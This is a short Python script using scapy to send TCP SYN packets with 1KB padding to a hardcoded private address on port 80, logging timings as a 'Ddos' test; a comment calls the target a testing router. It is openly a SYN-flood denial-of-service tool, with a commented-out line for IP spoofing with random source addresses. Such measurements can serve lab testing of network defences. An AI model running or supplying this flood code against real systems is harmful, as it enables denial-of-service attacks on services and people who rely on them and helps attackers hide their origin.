import argparse

from scapy.layers.inet import IP, TCP

from scapy.all import *
import time





# target IP address (should be a testing router/firewall)
f = open("syns_results_p.txt", "a")

start_attack = time.time()
counter=0
for i in range(0,2):
     f.write("Loop number" + " " + str(i))
     f.write("\n")

     for j in range(0,5):
        counter+=1
        start = time.time()
        print("Ddos start" "" + str(j) + "" "iteration")
        target_ip = "192.168.248.138"
        # the target port u want to flood
        target_port = 80
        # forge IP packet with target ip as the destination IP address
        ip = IP(dst=target_ip)
        # or if you want to perform IP Spoofing (will work as well)
        # ip = IP(src=RandIP("192.168.1.1/24"), dst=target_ip

        # forge a TCP SYN packet with a random source port
        # and the target port as the destination port
        tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
        # add some flooding data (1KB in this case)
        raw = Raw(b"X"*1024)
        # stack up the layers
        p = ip / tcp / raw
        # send the constructed packet in a loop until CTRL+C is detected
        send(p, loop=0, verbose=0)
        end = time.time()
        total = end-start
        print('Execution time:', total, 'seconds')

        f.write("Index of syn request" + " " + str(j))
        f.write("\n")
        f.write("Time to take" + " " + str(total) + "  " + "Sec")
        f.write("\n")
        f.write("\n")

print("Ddos are done")
end_attack = time.time()
total_attack=end_attack-start_attack
average=total_attack/counter

f.write("Total attack time took" + " " + str(total_attack))
f.write("\n")
f.write("The average time per packet is" + " " + str(average) )
print(counter)
f.close()